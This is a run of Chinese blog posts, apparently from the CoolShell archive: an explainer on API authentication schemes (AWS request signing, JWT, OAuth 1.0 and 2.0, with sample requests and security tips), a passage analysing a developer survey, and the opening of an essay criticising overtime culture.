把AppID和HMAC用于API认证，目前来说，玩得最好最专业的应该是AWS了，我们可以通过[S3的API请求签名文档](https://docs.aws.amazon.com/zh_cn/general/latest/gr/sigv4-create-canonical-request.html)看到AWS是怎么玩的。整个过程还是非常复杂的，可以通过下面的图片流程看个大概。基本上来说，分成如下几个步骤：

1. 把HTTP的请求（方法、URI、查询字串、头、签名头，body）打个包叫 `CanonicalRequest`，作个SHA-256的签名，然后再做一个base16的编码
2. 把上面的这个签名和签名算法 `AWS4-HMAC-SHA256`、时间戳、Scop，再打一个包，叫 `StringToSign`。
3. 准备签名，用 `AWSSecretAccessKey`来对日期签一个 `DataKey`，再用 `DataKey` 对要操作的Region签一个 `DataRegionKey` ，再对相关的服务签一个`DataRegionServiceKey` ，最后得到 `SigningKey`.
4. 用第三步的 `SigningKey`来对第二步的 `StringToSign` 签名。

![img](photo/sigV4-using-query-params.png)

 

最后，发出HTTP Request时，在HTTP头的 `Authorization`字段中放入如下的信息：

```
Authorization: AWS4-HMAC-SHA256 
               Credential=AKIDEXAMPLE/20150830/us-east-1/iam/aws4_request, 
               SignedHeaders=content-type;host;x-amz-date, 
               Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7
```

 

其中的 `AKIDEXAMPLE` 是 AWS Access Key ID， 也就是所谓的 AppID，服务器端会根据这个AppID来查相关的 Secret Access Key，然后再验证签名。如果，你对这个过程有点没看懂的话，你可以读一读这篇文章——《[Amazon S3 Rest API with curl](https://czak.pl/2015/09/15/s3-rest-api-with-curl.html)》这篇文章里有好些代码，代码应该是最有细节也是最准确的了。

这种认证的方式好处在于，AppID和AppSecretKey，是由服务器的系统开出的，所以，是可以被管理的，AWS的IAM就是相关的管理，其管理了用户、权限和其对应的AppID和AppSecretKey。但是不好的地方在于，这个东西没有标准 ，所以，各家的实现很不一致。比如： [Acquia 的 HMAC](https://github.com/acquia/http-hmac-spec)，[微信的签名算法](https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=4_3) （这里，我们需要说明一下，微信的API没有遵循HTTP协议的标准，把认证信息放在HTTP 头的 `Authorization` 里，而是放在body里）

#### JWT – JSON Web Tokens

JWT是一个比较标准的认证解决方案，这个技术在Java圈里应该用的是非常普遍的。JWT签名也是一种MAC（[Message Authentication Code](https://en.wikipedia.org/wiki/Message_authentication_code)）的方法。JWT的签名流程一般是下面这个样子：

1. 用户使用用户名和口令到认证服务器上请求认证。
2. 认证服务器验证用户名和口令后，以服务器端生成JWT Token，这个token的生成过程如下：
   - 认证服务器还会生成一个 Secret Key（密钥）
   - 对JWT Header和 JWT Payload分别求Base64。在Payload可能包括了用户的抽象ID和的过期时间。
   - 用密钥对JWT签名 `HMAC-SHA256(SecertKey, Base64UrlEncode(JWT-Header)+'.'+Base64UrlEncode(JWT-Payload));`
3. 然后把 `base64(header).base64(payload).signature` 作为 JWT token返回客户端。
4. 客户端使用JWT Token向应用服务器发送相关的请求。这个JWT Token就像一个临时用户权证一样。

当应用服务器收到请求后：

1. 应用服务会检查 JWT Token，确认签名是正确的。
2. 然而，因为只有认证服务器有这个用户的Secret Key（密钥），所以，应用服务器得把JWT Token传给认证服务器。
3. 认证服务器通过JWT Payload 解出用户的抽象ID，然后通过抽象ID查到登录时生成的Secret Key，然后再来检查一下签名。
4. 认证服务器检查通过后，应用服务就可以认为这是合法请求了。

我们可以看以，上面的这个过程，是在认证服务器上为用户动态生成 Secret Key的，应用服务在验签的时候，需要到认证服务器上去签，这个过程增加了一些网络调用，所以，JWT除了支持HMAC-SHA256的算法外，还支持RSA的非对称加密的算法。

使用RSA非对称算法，在认证服务器这边放一个私钥，在应用服务器那边放一个公钥，认证服务器使用私钥加密，应用服务器使用公钥解密，这样一来，就不需要应用服务器向认证服务器请求了，但是，RSA是一个很慢的算法，所以，虽然你省了网络调用，但是却费了CPU，尤其是Header和Payload比较长的时候。所以，一种比较好的玩法是，如果我们把header 和 payload简单地做SHA256，这会很快，然后，我们用RSA加密这个SHA256出来的字符串，这样一来，RSA算法就比较快了，而我们也做到了使用RSA签名的目的。

最后，我们只需要使用一个机制在认证服务器和应用服务器之间定期地换一下公钥私钥对就好了。

这里强烈建议全文阅读 Anglar 大学的 《[JSW：The Complete Guide to JSON Web Tokens](https://blog.angular-university.io/angular-jwt/)》

#### OAuth 1.0

OAuth也是一个API认证的协议，这个协议最初在2006年由Twitter的工程师在开发OpenID实现的时候和社交书签网站Ma.gnolia时发现，没有一种好的委托授权协议，后来在2007年成立了一个OAuth小组，知道这个消息后，Google员工也加入进来，并完善有善了这个协议，在2007年底发布草案，过一年后，在2008年将OAuth放进了IETF作进一步的标准化工作，最后在2010年4月，正式发布OAuth 1.0，即：[RFC 5849](https://tools.ietf.org/html/rfc5849) （这个RFC比起TCP的那些来说读起来还是很轻松的），不过，如果你想了解其前身的草案，可以读一下 [OAuth Core 1.0 Revision A](http://oauth.net/core/1.0a/) ，我在下面做个大概的描述。

根据RFC 5849，可以看到 OAuth 的出现，目的是为了，用户为了想使用一个第三方的网络打印服务来打印他在某网站上的照片，但是，用户不想把自己的用户名和口令交给那个第三方的网络打印服务，但又想让那个第三方的网络打印服务来访问自己的照片，为了解决这个授权的问题，OAuth这个协议就出来了。

- 这个协议有三个角色：
  - **User（照片所有者-用户）**
  - **Consumer（第三方照片打印服务）**
  - **Service Provider（照片存储服务）**
- 这个协义有三个阶段：
  - **Consumer获取Request Token**
  - **Service Provider 认证用户并授权Consumer**
  - **Consumer获取Access Token调用API访问用户的照片**

整个授权过程是这样的：

1. Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret
2. 当 User 访问 Consumer 时，Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）
3. Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（`oauth_token`）和 Request Token Secret （`oauth_token_secret`）
4. Consumer 收到 Request Token 后，使用HTTP GET 请求把 User 切到 Service Provide 的认证页上（其中带上Request Token），让用户输入他的用户和口令。
5. Service Provider 认证 User 成功后，跳回 Consumer，并返回 Request Token （`oauth_token`）和 Verification Code（`oauth_verifier`）
6. 接下来就是签名请求，用Request Token 和 Verification Code 换取 Access Token （`oauth_token`）和 Access Token Secret (`oauth_token_secret`)
7. 最后使用Access Token 访问用户授权访问的资源。

下图附上一个Yahoo!的流程图可以看到整个过程的相关细节。

![img](photo/oauth_graph.gif)

因为上面这个流程有三方：User，Consumer 和 Service Provide，所以，又叫 3-legged flow，三脚流程。OAuth 1.0 也有不需要用户参与的，只有Consumer 和 Service Provider 的， 也就是 2-legged flow 两脚流程，其中省掉了用户认证的事。整个过程如下所示：

1. Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret
2. Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）
3. Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（`oauth_token`）和 Request Token Secret （`oauth_token_secret`）
4. Consumer 收到 Request Token 后，直接换取 Access Token （`oauth_token`）和 Access Token Secret (`oauth_token_secret`)
5. 最后使用Access Token 访问用户授权访问的资源。

最后，再来说一说OAuth中的签名。

- 我们可以看到，有两个密钥，一个是Consumer注册Service Provider时由Provider颁发的 Consumer Secret，另一个是 Token Secret。
- 签名密钥就是由这两具密钥拼接而成的，其中用 `&`作连接符。假设 Consumer Secret 为 `j49sk3j29djd` 而 Token Secret 为`dh893hdasih9`那个，签名密钥为：`j49sk3j29djd&dh893hdasih9`
- 在请求Request/Access Token的时候需要对整个HTTP请求进行签名（使用HMAC-SHA1和HMAC-RSA1签名算法），请求头中需要包括一些OAuth需要的字段，如：
  - **Consumer Key** ： 也就是所谓的AppID
  - **Token**： Request Token 或 Access Token
  - **Signature Method** ：签名算法比如：HMAC-SHA1
  - **Timestamp**：过期时间
  - **Nonce**：随机字符串
  - **Call Back**：回调URL

下图是整个签名的示意图：

![img](photo/oauth_singature.png)

图片还是比较直观的，我就不多解释了。

#### OAuth 2.0

在前面，我们可以看到，从Digest Access， 到AppID+HMAC，再到JWT，再到OAuth 1.0，这些个API认证都是要向Client发一个密钥（或是用密码）然后用HASH或是RSA来签HTTP的请求，**这其中有个主要的原因是，以前的HTTP是明文传输，所以，在传输过程中很容易被篡改，于是才搞出来一套的安全签名机制**，所以，这些个认证的玩法是可以在HTTP明文协议下玩的。

这种使用签名方式大家可以看到是比较复杂的，所以，对于开发者来说，也是很不友好的，在组织签名的那些HTTP报文的时候，各种，URLEncode和Base64，还要对Query的参数进行排序，然后有的方法还要层层签名，非常容易出错，另外，这种认证的安全粒度比较粗，授权也比较单一，对于有终端用户参与的移动端来说也有点不够。所以，在2012年的时候，OAuth 2.0 的 [RFC 6749](https://tools.ietf.org/html/rfc6749) 正式放出。

**OAuth 2.0依赖于TLS/SSL的链路加密技术（HTTPS），完全放弃了签名的方式，认证服务器再也不返回什么 token secret 的密钥了，所以，OAuth 2.0是完全不同于1.0 的，也是不兼容的**。目前，Facebook 的 Graph API 只支持OAuth 2.0协议，Google 和 Microsoft Azure 也支持Auth 2.0，国内的微信和支付宝也支持使用OAuth 2.0。

下面，我们来重点看一下OAuth 2.0的两个主要的Flow：

- 一个是Authorization Code Flow， 这个是 3 legged 的
- 一个是Client Credential Flow，这个是 2 legged 的。

##### **Authorization Code Flow**

Authorization Code 是最常使用的OAuth 2.0的授权许可类型，它适用于用户给第三方应用授权访问自己信息的场景。这个Flow也是OAuth 2.0四个Flow中我个人觉得最完整的一个Flow，其流程图如下所示。

![img](photo/auth_code_flow.png)

 

下面是对这个流程的一个细节上的解释：

1）当用户（Resource Owner）访问第三方应用（Client）的时候，第三方应用会把用户带到认证服务器（Authorization Server）上去，主要请求的是 `/authorize` API，其中的请求方式如下所示。

```
https://login.authorization-server.com/authorize?
        client_id=6731de76-14a6-49ae-97bc-6eba6914391e
        &response_type=code
        &redirect_uri=http%3A%2F%2Fexample-client.com%2Fcallback%2F
        &scope=read
        &state=xcoiv98CoolShell3kch
```

其中：

- - `client_id`为第三方应用的App ID
  - `response_type=code`为告诉认证服务器，我要走Authorization Code Flow。
  - `redirect_uri`意思是我跳转回第三方应用的URL
  - `scope`意是相关的权限
  - `state` 是一个随机的字符串，主要用于防CSRF攻击。

2）当Authorization Server收到这个URL请求后，其会通过 `client_id`来检查 `redirect_uri`和 `scope`是否合法，如果合法，则弹出一个页面，让用户授权（如果用户没有登录，则先让用户登录，登录完成后，出现授权访问页面）。

3）当用户授权同意访问以后，Authorization Server 会跳转回 Client ，并以其中加入一个 Authorization Code。 如下所示：

```
https://example-client.com/callback?
        code=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG
        &state=xcoiv98CoolShell3kch
```

我们可以看到，

- - 请流动的链接是第 1）步中的 `redirect_uri`
  - 其中的 `state` 的值也和第 1）步的 `state`一样。

4）接下来，Client 就可以使用 Authorization Code 获得 Access Token。其需要向 Authorization Server 发出如下请求。

```
POST /oauth/token HTTP/1.1
Host: authorization-server.com
 
code=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG
&grant_type=code
&redirect_uri=https%3A%2F%2Fexample-client.com%2Fcallback%2F
&client_id=6731de76-14a6-49ae-97bc-6eba6914391e
&client_secret=JqQX2PNo9bpM0uEihUPzyrh
```

5）如果没什么问题，Authorization 会返回如下信息。

```
{
  "access_token": "iJKV1QiLCJhbGciOiJSUzI1NiI",
  "refresh_token": "1KaPlrEqdFSBzjqfTGAMxZGU",
  "token_type": "bearer",
  "expires": 3600,
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciO.eyJhdWQiOiIyZDRkM..."
}
```

其中，

- - `access_token`就是访问请求令牌了
  - `refresh_token`用于刷新 `access_token`
  - `id_token` 是JWT的token，其中一般会包含用户的OpenID

6）接下来就是用 Access Token 请求用户的资源了。

```
GET /v1/user/pictures
Host: https://example.resource.com

Authorization: Bearer iJKV1QiLCJhbGciOiJSUzI1NiI
```

 

#####  Client Credential Flow

Client Credential 是一个简化版的API认证，主要是用于认证服务器到服务器的调用，也就是没有用户参与的的认证流程。下面是相关的流程图。

![img](photo/client_credentials_flow.png)

这个过程非常简单，本质上就是Client用自己的 `client_id`和 `client_secret`向Authorization Server 要一个 Access Token，然后使用Access Token访问相关的资源。

请求示例

```
POST /token HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=czZCaGRSa3F0Mzpn
&client_secret=7Fjfp0ZBr1KtDRbnfVdmIw
```

返回示例

```
{
  "access_token":"MTQ0NjJkZmQ5OTM2NDE1ZTZjNGZmZjI3",
  "token_type":"bearer",
  "expires_in":3600,
  "refresh_token":"IwOGYzYTlmM2YxOTQ5MGE3YmNmMDFkNTVk",
  "scope":"create"
}
```

这里，容我多扯一句，微信公从平台的开发文档中，使用了OAuth 2.0 的 Client Credentials的方式（参看文档“[微信公众号获取access token](https://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421140183)”），我截了个图如下所谓。我们可以看到，**微信公众号使用的是GET方式的请求，把AppID和AppSecret放在了URL中，虽然这也符合OAuth 2.0，但是并不好，因为大多数网关代理会把整个URI请求记到日志中。我们只要脑补一下腾讯的网关的Access Log，里面的日志一定会有很多的各个用户的AppID和AppSecret……**

![img](photo/wechat.dev_-1024x876.png)

 

#### 小结

讲了这么多，我们来小结一下（下面的小结可能会有点散）

##### 两个术语和三个概念

- 区分两个术语：Authentication（认证） 和 Authorization （授权），前者是证明请求者是身份，就像身份证一样，后者是为了获得权限。身份是区别于别人的证明，而权限是证明自己的特权。Authentication为了证明操作的这个人就是他本人，需要提供密码、短信验证码，甚至人脸识别。Authorization 则是不需要在所有的请求都需要验人，是在经过Authorization后得到一个Token，这就是Authorization。就像护照和签证一样。
- 区分三个概念：编码Base64Encode、签名HMAC、加密RSA。Base64编码是为了更好的传输（没有怪异的字符，可以传输二进制文件），等同于明文，HMAC签名是为了信息不能被篡改，RSA加密是为了不让别人看到是什么信息。

##### 明白一些初衷

- 使用复杂地HMAC哈希签名方式主要是应对当年没有TLS/SSL加密链路的情况。
- JWT把 `uid` 放在 Token中目的是为了去掉状态，但不能让用户修改，所以需要签名。
- OAuth 1.0区分了两个事，一个是第三方的Client，一个是真正的用户，其先拿Request Token，再换Access Token的方法主要是为了把第三方应用和用户区分开来。
- 用户的Password是用户自己设置的，复杂度不可控，服务端颁发的Serect会很复杂，但主要目的是为了容易管理，可以随时注销掉。
- OAuth 协议有比所有认证协议有更为灵活完善的配置，如果使用AppID/AppSecret签名的方式，又需要做到可以有不同的权限和可以随时注销，那么你得开发一个像AWS的IAM这样的账号和密钥对管理的系统。

##### 相关的注意事项

- 无论是哪种方式，我们都应该遵循HTTP的规范，把认证信息放在 `Authorization` HTTP 头中。
- 不要使用GET的方式在URL中放入secret之类的东西，因为很多proxy或gateway的软件会把整个URL记在Access Log文件中。
- 密钥Secret相当于Password，但他是用来加密的，最好不要在网络上传输，如果要传输，最好使用TLS/SSL的安全链路。
- HMAC中无论是MD5还是SHA1/SHA2，其计算都是非常快的，RSA的非对称加密是比较耗CPU的，尤其是要加密的字符串很长的时候。
- 最好不要在程序中hard code 你的 Secret，因为在github上有很多黑客的软件在监视各种Secret，千万小心！这类的东西应该放在你的配置系统或是部署系统中，在程序启动时设置在配置文件或是环境变量中。
- 使用AppID/AppSecret，还是使用OAuth1.0a，还是OAuth2.0，还是使用JWT，我个人建议使用TLS/SSL下的OAuth 2.0。
- 密钥是需要被管理的，管理就是可以新增可以撤销，可以设置账户和相关的权限。最好密钥是可以被自动更换的。
- 认证授权服务器（Authorization Server）和应用服务器（App Server）最好分开。

(全文完)

有4.2%，大约是参与调查人员的300多人，如果这些人20岁左右参加工作，那么说明他们在1990左右就开始写代码，事实上那个时间点别说是程序员了，连电脑用户都不多。**电脑和互联网真正暴发的时间还是在1995年 – 2000年之间，不过，那个时间点程序员的总体人数也不多，而行业越来越火才会导致大量的人进入到这个行业中，这个转换过程基本上去需要3-5年，也就是从2000年后才开始有大量的人拥入程序员这个行业，程序员的人数在过去30年间也是呈增涨态势的，所以，我个人认为，所谓的“众多老程序员”的比例会被2005年以后大量拥入程序员行业的年青人所“稀释”。所以，上图的比例不能完全说明程序员是个青春饭**。

但是，我们还是要正视老牌资深的程序员越来越少的这个事实，在这份报告第三部分中说了一些和程序员职业生涯相关的调查，如下：

- **在被问到有多少人对自己的职业满意的时**。有40%的人觉得很满意，而有34.3%的人觉得一般满意，有10%的人说不清，还有15%的人是不满意的。可以看到有不少人是对这个职业生涯是有想法的。
- **在被问到有多少人想转管理而可以挣得更多时**。有30%的人是说想转的，有51%的人是明确不转的，还有20%的人是说不知道。可见，想转管理的人最多可能会有一半的人。
- **在被问到有多少人想转管理时**。有1/3的人是明确不想转的，而有1/4的人是明确是想转，而有36%的人则是不说，观望中。可见，的确是有很多想想转管理的。

**我们可以看到，程序员中并不是所有的人都是可以坚持这么长时间的，这也挺正常的，对很大一部分人来说，对这个职业是有或多或少的不满意的，也有一部分人可能会随着技术的更新被淘汰，还有另外很大一部分人是想转管理的。所以，能够长时间地跟上形势长时间地喜欢写代码，并且对程序员这个的职业长期满意，不想转管理的，的确是为随时年龄的越大也越来越少**。

**但我们完全可以看出来，程序员的主力军在20-40岁这个区间，而30岁左右的程序员是年富力强（经验和能力都很好）的黄金时间**。

老程序员在国外似乎不会存在多大的问题，但在国内会有一些问题，所以，对于像我一样喜欢写代码、打算长久做程序员的兄弟，这里分享一些相关的经验。

1. **持续高效地学习**。软件行业的新技术层出不穷，旧的技术淘汰很快，所以我们更要多多学习基础技术和原理，那些都是很难改变的，并且基础扎实了后，学习新的技术也才会更快速。其间我们也不要乱学新技术，我们要关注那些有潜力的技术，也就看准了再学（参看酷壳的《[Go语言、Docker和新技术](https://coolshell.cn/articles/18190.html)》）。注意，而是跟上大时代已经比较不容易，引领时代的人还是少数，所以，还是要更为高效地学习。
2. **积极面对他人的不解**。 很多时候，总是会有人说：“到了你这个年纪怎么还在做程序员？”，这句话感觉就是对程序员这个职业的一种羞辱，社会的价值观感觉容不下大龄程序员。这个时候，我一般会跟他们解释到，我40来岁了，我觉得自己的状态还很好，工作完成没什么问题，偶尔加班到凌晨也行，新知识和技术我学起来不比年轻人慢，我在这个年纪有的经验比他们都多，而且，我这个年纪还在写代码，说明我真的喜欢这个事，**像我这样的人能够长时间坚持做一个职业的人这个世界已经不多了，你们应该珍惜……**
3. **找到自己的定位**。我们需要做好职业规划、财务和心理方面的准备。40岁的程序员，所能竞争的一定是自己的认识和经验，所以，40岁以后如果你还是很喜欢这一行业，你的社会阅历和经历以及对这个社会的理解，可以让你做一些有创新的事，除此之外，你还可以做一个教练、老师、咨询、专家……，用你的经验和能力帮助下一代和一些中小型的公司，这不但是他们的刚需，同时也会让重新焕发的。

#### 第二部分，技术

首先，在这部分，主要是了解一些技术，这部分的技术可以给于程序员们一些指导。

| 最流行的语言                                       | 最热门的语言                                      |
| :------------------------------------------------- | :------------------------------------------------ |
| ![img](photo/06-06.Popular.Languages-669x1024.png) | ![img](photo/06-07.Loved_.Languages-679x1024.png) |

我们可以看到，

- Javascript/HTML/CSS是很多人都会用到的，后面的是SQL，这个也没什么问题，无论前后端的人，或多或少都会要用到的，这些技术感觉已经成为了基础必会的技术了，就像数中的加减乘除一样。
- Python/Java/Shell 是后端开发主流语言的前三强，Python在今年超过了Java。这里让我比较好奇的是居然还有很多人用Shell，这估计跟运维有关，所以，Python的热可能也是通过运维和大数据相关。
- 流行语言后，第二梯队的是 C# / PHP / C++ / TypeScript / C ，接下来的是： Ruby / Go / Swift / Kotlin /WebAssembly / Rust… 。但在最被程序员喜欢的编程语言中：Rust / Python / TypeScript / Koltin / WebAssembly / Swift / Go… 都是排在前几名的。**程序语言每隔一段时间就会整出一些新的语言来，我们一定要明白新出来的东西主要是为了解决什么样的问题，不然很容易迷失。**
- 在后面还有一个编程语言的薪资图，我们可以看到，在上面被提过的这些个编程语言中，**Go语言的薪资是最高的（这可能是因为Go语言写关键的系统级的中件间——因为Go语言正在成为云计算的第一编程语言）**，然后是Scala、Ruby、WebAssembly、Rust、Erlang、Shell、Python、Typescript……

**通过这些个信息，我们可以看出主流技术、有潜力的技术，传统过气技术，以及相关薪资，对我们在选择编程语言上有一定的启示。**

在后面，我们可以看到:

- 在 Web 开发框架上，主流使用还是 jQuery, React.js，Angular.js 为最前面的三个前端开发框架。而被程序员所喜欢的则是 React.js，Vue.js，Express, Spring，程序员非常不喜欢 Drupal，jQuery，Ruby on Rails 和Angular.js……
- 在其它开发框架/库/工具上，主流是Node.js、.NET、Pandas、Unity 3D、Tensorflow、Ansible、Cordova、Xamarin……而程序员比较喜欢的是.NET、Torch/PyTorch、Flutter、Pandas、Tensorflow、Node.js …
- 在操作系统上，主流使用Linux、Windows、Docker、Android、AWS……，而程序员最喜欢的是Linux、Docker、Kubernetes、Raspberry Pi、AWS、MacOS、iOS……
- 在数据库上，MySQL、PostgreSQL、MSSQL、SQLite、MongoDB、Redis、Elasticsearch是比较主流的，而程序员非常喜欢的是，Redis、PostgreSQL、Elasticsearch、Firebase、MongoDB……，程序员比较讨厌的是 Couchbase、Oracle、Cassandra、MySQL。

**从这些个图表中，我们可以看到主流和有潜力的技术是什么，我们可以看到 Windows 的技术并没有过时，感觉似乎都有可能会卷土重来，但是，开源的技术来势凶凶，正在吞食整个软件业，不容小觑，Docker/Kubernetes无论是在主流应用上还是被程序员的喜好上都是非常猛的，而云平台的AWS开始成为标准平台技术……**

接下来的开发工具中，我们可以看到：

- Visual Studio Code 成为了最流行的开发工具。让我没有想到的是跟在后面的是 Notepad++（好久没用这个工具了，我得找回来用用了），而IntelliJ、Vim、Sublime Text排以后面。 Eclipse 和 Atom 动力不足，Emacs 开始变得小众了。
- 程序员主要的开发平台还是Windows占了近1/2， MacOS和Linux随后，各占1/4。
- 有38%的人使用容器技术做开发，30%的人使用容器做测试，在生产线上使用容器的有26%

**看样子编程开发工具还是Visual Studio 和 IntelliJ的天下，MacOS/Linux正在抢Windows的开发市场**

接下来，StackOverflow给了一个技术圈的图

![img](photo/06-08.Technology.Circle-1024x1024.png)

从上面这个图中，我们可以看以技术的几圈子：

- **Microsoft圈** – Windows、.NET、ASP.NET、C#、Azure、SQL Server
- **Java圈** – Java、Spring
- **手机圈** – Android、 iOS、Kotlin、Swift、Firebase
- **前端圈** – Javascript、React.js、Angular.js、PHP
- **大数据圈** – Python、TensorFlow、Torch/PyTorch
- **基础平台圈** – Linux、Shell、Vim、Docker、Kubernetes、Elasticsearch、Redis……
- **其它圈子** – C/C++/汇编圈子、Ruby圈子、Hadoop/Spark圈子、……

**看到谁的圈子大了吧，圈子大的并不代表技术实力强或是有前途，不过可以代表在那个圈子相关的关联技术，一方面，可以给你一些相关的参考，另一方面，整体可以让你看到全部的目前比较主流的技术。**

#### 第三部份 工作

在第三部份工作中，我们可以看到如下的一些数据：

- 有3/4的程序员是全职的，10%左右的程序员是自由职业，6%左右的程序员是失业的，这个比例在北美、印度和欧洲都差不多。
- 有1/3的人在过去一年内换过工作，1/4的人在过去1-2年间换过工作，1/3的人在2-4年换过工作。
- 程序员找工作时，影响程序员的几个主要因素是：技术（编程语言、框架和使用的技术）、办公环境和公司文化、灵活的时间和安排、更专业的机会、远程工作……
- 影响程序员工作的几大因素是：有干扰的工作环境、开会、要干一些和开发无关的事、人手不够、管理不够、工具不够、通勤时间……
- 对于工程质量，有近70%的人有Code Review，而30%的则没有；有60%多的人有Unit Test，而不到40%的没有……

**从工作中我们可以看到，程序员还是比较关心技术和公司文化的，换工作也是这个职业很正常的特性，他们并不喜欢被打扰，希望有足够的时间，而对于工程质量还是很有追求的。**

最后用一张程序员的“**每周工作时间**” 来结束本文！

![img](photo/07-09.Hours_.Worked.Per_.Week_-1024x640.png)

祝大家快乐！

（全文完）

# “努力就会成功”

#####  [2019年04月17日 ](https://coolshell.cn/articles/19271.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [110 条评论](https://coolshell.cn/articles/19271.html#comments) 159,372 人阅读

![img](photo/busy.work_-300x166.jpg)那一年，我加入了某知名公司的某知名部门，在办公室中，我看到了到处都挂着——“努力就会成功”的条幅，这个部门中大多数员工的邮件签名都会有“努力就会成功”，我感到一种热血沸腾的气氛，这是我在多年工作来都没有感受到的，当时挺高兴地能和这样一群人工作，也没多想。直到有一天，我看到这些高级的软件工程师们把自己关在又挤又吵的会议室中，拼命地加班，真是拼命，周一到周日，每天早上10点到凌晨3点甚至凌晨5点，连国庆节都来上班，就在这样的环境和状态下，连续干了三个多月……上线前，QA找到了1000多个bug（你没看错，就是一千多个），最后这个项目用了1年多的时间来返工，本来一个6-8个月的项目，团队被打了鸡血想在3个月内完成，最终却花了近两年的时间来返工……（要知道，我以前在外国公司工作，外国老板看到团队在长时间加班会感到焦虑的，因为加班通常代表着有不好的事情正在发生……）

所以对此，我是有点看不懂的，看不懂的是，为什么这么一群聪明的人，放着明亮宽敞的办公桌不用，硬要挤在一个又窄又小又吵又热的小空间里工作，而且要这么透支地写那么重要的很关键的系统级的代码……这就好像，一架在一个小作坊里被人加班加点赶工出来的飞机，谁敢坐啊？！老实说，这群工程师真是很优秀的工程师，他们完全是可以做得更好的……但是却做出了如此蹩脚和糟糕的系统……他们说，这样坐在一起可以做到快速沟通，然而，我觉得这恰恰是一种没有章法的表现。

也是在这家公司，在这个项目烂尾一年前，公司感到了危机，CEO号召全体996，举全公司之力从董事长到下面基层员工对抗外部所谓的威胁，有的部门为了表现，甚至997，然而，在一年后，做出了一个烂得不能再烂的软件，最终以失败告终，很多人包括CEO也因此下课……



这是最让我看不懂的一个事了，为什么这么如此成功的公司的高级管理层会做出这样的事情，而且还制定这样的政策……把这么优秀的员工以及公司大把把数以亿计的钞票投入到这种错误的路线上来，而且还拼命地加班…… 他们脑子里在想什么呢？难道他们真的以为，有足够多的钱，足够多的人，然后拼命加班，就能打败对手吗？……

#### 你喜欢这句话吗？

“努力就会成功”，“加班就会有成就”，“勤劳就会致富”……是这样吗？仔细思考一些，这些话存在严重的逻辑问题，我们在高中的时候学过“充分条件”，“必要条件”和“充要条件”！**“努力就会成功”这句话，把“努力”说成了“成功”的充要条件，这不就是错的吗？努力只是成功的必要条件之一。**你在错误的方向或是格局很小的方向上努力，能有用么？你努力地要饭，你努力地当搬运工，你努力地打骚扰电话销卖保险…… 在错误和小格局的方向上努力，你还觉得努力还有用吗？

但是很多人是很喜欢“努力就会成功”这句话，这类人也很喜欢看很多小人物通过自己的努力变成成功人士的励志的故事，为什么这种故事会被很多人喜欢甚至感动。因为这很符合大众的心理诉求，这种诉求其实就是一种只要使力只要拼命了就可以成功的心理诉求，**因为这类人基本上都是能力有限，不知道怎么提升自己的人，当他们看到只要拼命使力就可以成功的观点时，他们就会有共鸣，就会感到，不用学习那些晦涩难懂高级的知识，不用掌握和练习哪些高级技能，自己只需要在低级的事情上拼命和努力，加更多的班和干更多活，自己就会像电影中的那些小人物一样，总有一天会成功的**……

**“努力就会成功，勤劳就会致富”，不但符合那些低级管理者的利益诉求，同样符合那些能力不足不愿意学习和成长的人的诉求。因为，他们混淆了行动与进展，忙碌与多产，他们以为能靠蛮力可以弥补思维上的惰性，靠拼命可以弥补能力上的不足……**

喜欢或认同这句话的人基本是能力上有问题的人，这类适合做劳动密集型的事。不信你可以试试看，当一件事的难度超过一定程度的时候，那些聪明的人会找到更省力的方法，而能力上有问题的，还是在那使蛮力。

#### 我成长的过程

回想我的过去，我在2001年那年被外包到了某银行做开发，标准的9/10/6，封闭开发，就是用C语言在AIX系统里堆一些银行的交易逻辑，老实说，这个过程并没有让我学到什么东西，也没有什么成长，我每天想的就是我要离开这个地方，所以，我在晚上10点以后开始看书学习到11点半，并使用工作环境动手实践书上的代码，一年后，我精读了《TCP/IP详解》《Windows核心编程》《Java编程思想》等书。然后，我找到一份外企业的工作，月薪一下翻了三倍。

在外企不加班，但是当时的外企压力也很大，对代码的质量要求的也很高，来的第二个月，就因为代码写的太差，差点被开掉，所以，为了能够达到更高的标准，我自然也是很努力的，在周末甚至黄金周节假日我哪里都不去，我就去公司，但我不是在公司上班，因为我没有自己的电脑，所以，我只能蹭公司的电脑，这导致办公楼的管理人员经常打电话给我让我帮他在周末的时候管理物业…… **在这家公司是我成长最快的时候，然而，并不是因为我的努力，而是因为有很多比我牛逼的人在Code Review上给我大量的帮助，在项目上帮助我，我的努力学习虽然也有作用，但更多的是高手对我的帮助**。

**再回想一下我以前在职场上的很多关键点，不是因为我加班了，而是因为在某些关键问题上，我跳出来解决了其它人都解决不了的问题**，我解决了一个网络通信莫名其妙的断掉的问题，我把性能优化了很多倍，我解决了一个不能重现的一个困扰团队3个星期的问题（其实就是大家没有认真读文档），我在入职一个公司的第一天里就为这个公司解决了一个历史遗留问题……在Platform，我每周解决了bug数是全公司的其它人的总和还要多（从不加班），在路透，我带团队优化的系统的性能是全球所有研发中心最高的，在亚马逊，两周打通美国和德国的订单和商品列表系统……我也有失败的时候，**而我失败的时候，总是因为我搞不定事，即便是加班拼命努力也无济于事**！是的，我的职业生涯的成长，最根本的不是你有多努力，有多勤奋，而是你能搞定很多人搞不定的事！

你不信你可以看看你们公司那些不用加班，就算什么也不干，公司也要花钱养的技术人员，他们的成功一定不是努力和加班加出来的，**你会发现这些人拼的不是谁干的多，而是谁解决的问题更有难**。

**我加班996的时候，从来都不是我成长最快的时候，而我和一群牛人在解决难题的时才是我成长最快的时候。**

#### Work Smart

